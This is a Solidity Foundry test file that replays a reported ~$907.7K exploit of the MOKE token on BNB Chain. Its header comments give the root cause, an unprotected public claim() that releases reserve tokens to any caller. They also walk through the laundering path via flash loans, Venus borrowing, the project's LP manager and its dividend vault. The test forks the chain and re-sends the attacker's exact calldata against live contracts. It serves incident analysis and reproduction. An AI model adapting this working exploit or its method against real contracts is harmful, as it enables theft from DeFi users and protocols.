// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

// MOKE (Moke) - unprotected public `claim()` mints protocol-reserve MOKE to any caller,
//               laundered to BNB through the project's own LP manager + dividend vault.
// BNB Chain. ~$907.7K reported loss (TenArmor). No public root-cause writeup at build time;
// mechanism below was recovered by tracing the exploit tx from scratch.
//
// Exploit tx : 0x0776048b1b58064fb31b6513721811e7b44d6bdbe7bf5833158b241ca6756a8f
//              block 113652609, tx index 26.
//
// Attacker packaging (EIP-7702): the tx has `to == from == 0xE454...DCF8a`. That EOA had a
// 7702 delegation designator (0xef0100 || 0xc7fdea02...) installed in an EARLIER block and
// revoked later, so at the fork block the attacker EOA "is" its own exploit contract. This is
// the attacker delegating their OWN account to their OWN code and self-signing it - NOT a
// stolen key, compromised signer, admin role, or governance/proxy upgrade. Every victim call
// below is a plain public function reached by attacker-controlled state.
//
// Root cause (the actual bug):
//   MokeReleaseContract 0x684d722e (unverified; it IS MokeToken.releaseContract()) exposes a
//   PUBLIC `claim()` (payable, ~0.000341 BNB fee). Each call pulls a large fixed slice of the
//   MOKE sitting in the protocol's internal reserve pool (0x89715a07) straight to msg.sender
//   via MokeToken.releaseFromPair(caller, ~41.68M) + addReleasedBalance(caller, ~41.68M), with
//   NO check that the caller is entitled to that allocation. The attacker calls claim() 4x and
//   walks off with ~166M MOKE minted from reserves for a few tenths of a cent in fees.
//
// Cash-out path (all public, all the project's own plumbing):
//   - Moolah (Lista Lending) 0x8f73b65b flash-loans WBNB (403,344) + BTCB (3,169) for working
//     capital; Venus (vBTC/vBNB) is used to lever the BTCB into BNB.
//   - MokeLPManager 0xacabe59b removeLiquidity() unwinds the attacker's own pre-seeded LP.
//   - The stolen "released" MOKE can only move to whitelisted handlers, so it is fed into
//     MokeLPDividend 0x5ae569d8: distributeDividend() swaps the vault's MOKE to BNB and bumps
//     totalDividendPerLP, then claimDividend() is run across the 100 seeded holder accounts to
//     pull the BNB out. Flash loans + Venus borrow are repaid; the attacker EOA keeps the BNB.
//
// Reproduction: fork one block before the exploit (the 7702 delegation code, the attacker's
// pre-seeded LP position, and all protocol state already exist on-chain), then re-issue the
// EXACT original calldata against the attacker EOA, pranking it as msg.sender AND tx.origin.
// revm honours the on-chain 7702 delegation, so this runs the real attacker bytecode against
// the real victim contracts. Calldata is hardcoded below (no env vars, no guesswork). We do
// NOT re-run the earlier LP-seeding / delegation-install setup.
//
// Run:
//   forge test --contracts ./src/test/2026-07/MOKE_exp.sol --evm-version prague -vvv
//   (prague REQUIRED: EIP-7702 delegation + Venus rate model. Needs an ARCHIVE BSC RPC.)

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

contract MOKEExp is Test {
    address constant ATTACKER = 0xE454a9BAC1a44868e4A9Cbe1a4B5ac231D0DCF8a; // 7702-delegated EOA
    address constant IMPL = 0xC7fDEA027FEb41C8f3a45eC284280ce68f4e6Ff7;     // attacker exploit impl
    address constant RELEASE = 0x684D722EbF8980f49492f631f56765DD4Fb302A7;  // MokeToken.releaseContract (bug)
    address constant MOKE = 0x1A35C16cE21903Bc17Fd020c4ED73fEdC70c1b2A;
    address constant LP_MANAGER = 0xaCABE59B2FB33b895a58891231f5e18582B86F33;
    address constant DIVIDEND = 0x5ae569d8a0539a6A603E96A26ac8CaEA7CEba377;
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    uint256 constant EXPLOIT_BLOCK = 113_652_609;

    // Archive BSC RPC (repo `bsc` alias is not archive locally).
    string constant BSC_ARCHIVE = "https://bsc-mainnet.public.blastapi.io";

    // Exact original tx calldata: selector 0x20402f14(release, cakeLP, lpManager, address[100] holders).
    bytes constant EXPLOIT_CALLDATA =
        hex"20402f14000000000000000000000000684d722ebf8980f49492f631f56765dd4fb302a7000000000000000000000000ba6a49a97cc725b3c39d6c5e"
        hex"a6deffddb64fe6b8000000000000000000000000acabe59b2fb33b895a58891231f5e18582b86f330000000000000000000000000000000000000000"
        hex"0000000000000000000000800000000000000000000000000000000000000000000000000000000000000064000000000000000000000000d4a88c7a"
        hex"85e8136acb4e7e1e6222a567c663a398000000000000000000000000a7e20d4f581c2a963d92f2dcc4756178bf73a951000000000000000000000000"
        hex"f1ba8dacd6de56d1305f476fc970da2bd2cbe9b800000000000000000000000076f046429297956f5f16a62bfa3d6b62f2caa6070000000000000000"
        hex"0000000010d75011db7b05ef7d7e7d9dfad1dd2dc4b75d3e0000000000000000000000004940e363d77af5941d0278fb4b9aeb38287c160800000000"
        hex"0000000000000000ff2b0b60e18f3a99ad18230a1493a50051978a4e00000000000000000000000043e5dea5f148186b81ff3266cc852ae8f487cfcb"
        hex"00000000000000000000000066f5013caa936cd8995dc84f9d51e352965e7d320000000000000000000000001640268c40fd2fe9ba3a06f7b1b707f1"
        hex"85072a74000000000000000000000000c8e1154dd66016f8b0230ab4a2a82bac1f20a336000000000000000000000000b05fed5a5cd7323930e35091"
        hex"f00a501134044a210000000000000000000000003593745916604c81e5a2bad33849c3219749adb000000000000000000000000092b6c2c8ae11d636"
        hex"3bb2bdbb950315dc3bfdb22f000000000000000000000000fc6e5c4e548107b6d4e7b1bb98933a273d49d0e0000000000000000000000000eecd9e49"
        hex"c06a8e7eb72e6a1b014709d65665c21d0000000000000000000000009f8687a8a7f661b767d2c3ea70b2a6f24a391907000000000000000000000000"
        hex"d34b989569aa4997e83877b95f93b2db20ae89b7000000000000000000000000b7d1bf2598fbff83129bbf2b5450a8630206cb590000000000000000"
        hex"00000000b82759fafbcdd3b6a4968acc6645fd629f9a997f000000000000000000000000d0e0a5b134d8d4794f88a1d8b447490d46f1393d00000000"
        hex"00000000000000009a29bdcd74097126ba39b0d0fa518e8d9e286f83000000000000000000000000d2c5c6d214599a0cb38219477d7fe31389d6e1ef"
        hex"000000000000000000000000feb8907cb8f4db64acc4051c634fe990b823d378000000000000000000000000a4db6391b4c0478f502b0c18a7bec6d8"
        hex"2f6e2b8200000000000000000000000080ee55911262ec5e6908707767f0f32c8998e5120000000000000000000000002fc160152074c27ec5b7ba9b"
        hex"85058df0bfce2fe100000000000000000000000073df41859c3a241b59626caae588ef0f61d66d8500000000000000000000000062fea93d39b3ccd8"
        hex"d240e738695baee95179f4bb00000000000000000000000002473be9fba39277b58844aeccb85253418699430000000000000000000000005b0b40f9"
        hex"852c306bffea0953f7ca2eb617ff6c77000000000000000000000000e89a82d955561361c021141c30d849c063935a8f000000000000000000000000"
        hex"013b889dcbd56afc5fc245081b725b4fe7422a7e0000000000000000000000006cdb79f4f5e8e09a4cc230548f244dd0467e91ed0000000000000000"
        hex"00000000f45aa35652d2ba18accfcb3737c529210e009eee0000000000000000000000000192551a93a17260cdb0095ff9df8f658abe16e500000000"
        hex"00000000000000001bd64122fcfe1a12503218cb82019b6c680d269b0000000000000000000000003cf2929b976be530ae12898bb30911fb9b7f9f82"
        hex"0000000000000000000000005da6b253a7646679dc981a76e2d56430caa9f18a00000000000000000000000081003e66fb79886e4abb41491646de77"
        hex"1b38d761000000000000000000000000f2e12f27c56ad8eb6c8b464ee2ff57d79ff6f4670000000000000000000000000313e270d84cbba886bb5673"
        hex"7c82f2f97ba40bf9000000000000000000000000a4bf270000dadbc9471336d9fb813de9333477c70000000000000000000000002571fc590acb0777"
        hex"98192a567840bae7086cc4e5000000000000000000000000353e1a32cff866f96b804df3ed25bec9f91e3229000000000000000000000000dae4efac"
        hex"e3bcb36fb49beb7400e5bbce463838720000000000000000000000002abe285fdcb738975d794a8f57eac8ea8470bff0000000000000000000000000"
        hex"fb6d00738dd1893e69eeecd7ff76c91ef51679a900000000000000000000000086e3034bdfe03d356f1462dbf522f6bc154b7cb40000000000000000"
        hex"00000000dd9e0e4eed263ed0c88bd8986cec47948e53660b0000000000000000000000002283ba1471694894cdc20f67cd7478bef3295c5900000000"
        hex"0000000000000000556ddf3db0e231ddb877c746c35bff878efb4aaa000000000000000000000000959b319b3f33834a50bf58167a5df591f102da87"
        hex"000000000000000000000000315376d2c0bf3edb2fc9955f7789d6158aab1e220000000000000000000000003d4af5d54b440aca4acbb10ba67efb90"
        hex"3db28300000000000000000000000000eb7d60e939bd74400d10d45ef32d84d7b6ce8e010000000000000000000000007c4838a74f4f88a59e86c49d"
        hex"2f458cae69aab9dc0000000000000000000000003a5b152d57ccf30191de3c3812968a39bd88e651000000000000000000000000dc8a09d04b2b45e8"
        hex"f571d9c9ca64ab83d64212e9000000000000000000000000c2555b5dabdbe72eb45bc56b3abf6a248f614bf800000000000000000000000052f35505"
        hex"e181a4dd8174424fdfe7cca7bd35ee9e000000000000000000000000a6491094bce4d2787e54d1d33fa1be31ec88cc7d000000000000000000000000"
        hex"871c5adc363553d8ddf88963ce37c0128d34cce200000000000000000000000025e5013d0d071ae3a7ebcadbbd5c39f7f31ec8930000000000000000"
        hex"000000002210384762c6313bdf2109cbb4538169c8b10da40000000000000000000000000200b02051b6a2119532bb71ae37ea26aeaa912900000000"
        hex"000000000000000045444eec6f059f6538734df5a56aeca6a512f72d000000000000000000000000eb2d5791a0f4672b39c3d409b2049e932ba9930e"
        hex"0000000000000000000000007b6df309bdb34fe463f6a04bd917e3d4abca5d1e000000000000000000000000285a05be312e58bd21f27ba22fe1c017"
        hex"895693fc0000000000000000000000005b073fef1fe3313b680c2e7b092536f1e2b45c300000000000000000000000007271bebcaa52e331eede7a9d"
        hex"b41f1f3984602f71000000000000000000000000f50301fa42a5de59c123ed380b5c3d63ff4872870000000000000000000000006fbab48aba315d1d"
        hex"edab2d57bff569afb6363bbd0000000000000000000000002c6e794d6185e3519c2c34c175d20ab0b086e7a7000000000000000000000000581a7ab8"
        hex"adb1177206ac21c12dab8c7d59652379000000000000000000000000c0999d6cab6b0342fdd517cbae29d043dc19a43a000000000000000000000000"
        hex"d9c7b7027ea7269a1ec97e8d0cce816cccbdaa0e000000000000000000000000a1a8ef11a5ab91460015616c66f4e45ff7640fe20000000000000000"
        hex"00000000c43d53c31a55774e63b2788255c4ed757cd729cb000000000000000000000000355ab469f7df5d729d69b49c79aac58598157b0600000000"
        hex"0000000000000000109aff827252c1a87d69efa8d48d79f3be5b1126000000000000000000000000d5d659d504758f70284f0d603a71b072ab0121de"
        hex"00000000000000000000000020a919460d652e5c8cc55d26d32a97c06a9b16a00000000000000000000000001abff0e3e99927f67f3dfbde17b10704"
        hex"5769e50d000000000000000000000000f7e5c20913b58a3c62eb491bc5ce5cddef4ad6af000000000000000000000000b397f2dbd81b3b1cb29fb903"
        hex"da56e1c3b2e797e6000000000000000000000000980bb2a5cfef39201fb16cb60aa470f77883db7600000000000000000000000042e030df47764dff"
        hex"07781f48f9958a49bed606610000000000000000000000002e45d7456b0c72ca73f4a27375d05576588f0ae3000000000000000000000000942f9c5f"
        hex"2b19911c3dc3f296046d11c8290dce82000000000000000000000000195e8531326f5f5a5b99ed6d6b475e3d15ed38b4000000000000000000000000"
        hex"f50d877015a68071bd95987a75f2f3660347794400000000000000000000000058fa910dc5a869671078db17b7aaded9d3dd52990000000000000000"
        hex"0000000011f51eec023c0c735b54cb244b8a75f1ca712784000000000000000000000000d58212a008bad84a5d3abcb7db199a4548a5bb8a00000000"
        hex"0000000000000000d7c678130bf505cf3e28ed56c152710205fe19b1000000000000000000000000f2964fc4927c4bac0adccc494db1317b0509f646"
        hex"000000000000000000000000dcb0274687f0edf85cb07ede634f64ddceda9fb6000000000000000000000000669e469c61821528065926010ea67bb9"
        hex"f0c90730";

    function setUp() public {
        vm.createSelectFork(BSC_ARCHIVE, EXPLOIT_BLOCK - 1);
        vm.label(ATTACKER, "AttackerEOA(7702)");
        vm.label(RELEASE, "MokeReleaseContract");
        vm.label(MOKE, "MOKE");
        vm.label(LP_MANAGER, "MokeLPManager");
        vm.label(DIVIDEND, "MokeLPDividend");
    }

    function testExploit() public {
        // The attacker account carries an on-chain EIP-7702 delegation to its own impl at the
        // fork block (code == 0xef0100 || IMPL). Confirm it, so the replay provably runs the
        // real attacker bytecode and not some substitute.
        bytes memory code = ATTACKER.code;
        assertEq(code.length, 23, "expected 7702 delegation designator");
        assertEq(uint8(code[0]), 0xef);
        assertEq(uint8(code[1]), 0x01);
        assertEq(uint8(code[2]), 0x00);
        assertEq(address(bytes20(_slice(code, 3))), IMPL, "delegation not pointing at attacker impl");

        uint256 bnbPre = ATTACKER.balance;
        uint256 wbnbPre = IERC20(WBNB).balanceOf(ATTACKER);
        emit log_named_decimal_uint("Attacker BNB  before", bnbPre, 18);
        emit log_named_decimal_uint("Attacker WBNB before", wbnbPre, 18);

        // Replay the attack exactly: attacker EOA calls itself (7702) with the original calldata.
        vm.prank(ATTACKER, ATTACKER); // msg.sender AND tx.origin = attacker EOA
        (bool ok,) = ATTACKER.call(EXPLOIT_CALLDATA);
        require(ok, "exploit call reverted");

        uint256 bnbPost = ATTACKER.balance;
        uint256 wbnbPost = IERC20(WBNB).balanceOf(ATTACKER);
        // Net value extracted = BNB gained + any residual WBNB (attacker unwraps WBNB->BNB at the end).
        uint256 gain = (bnbPost + wbnbPost) - (bnbPre + wbnbPre);

        emit log_named_decimal_uint("Attacker BNB  after ", bnbPost, 18);
        emit log_named_decimal_uint("Attacker WBNB after ", wbnbPost, 18);
        emit log_named_decimal_uint("Attacker net BNB gain", gain, 18);
        // ~$907.7K at the ~$587/BNB price around the incident.
        emit log_named_uint("Approx USD gain @587/BNB", gain * 587 / 1e18);

        // Attacker nets ~1,546 BNB of value from a self-signed 7702 call into public functions,
        // matching the ~$907.7K reported loss.
        assertApproxEqAbs(gain, 1_546 ether, 5 ether, "unexpected attacker BNB gain");
    }

    function _slice(bytes memory b, uint256 start) internal pure returns (bytes20 out) {
        assembly { out := mload(add(add(b, 0x20), start)) }
    }
}
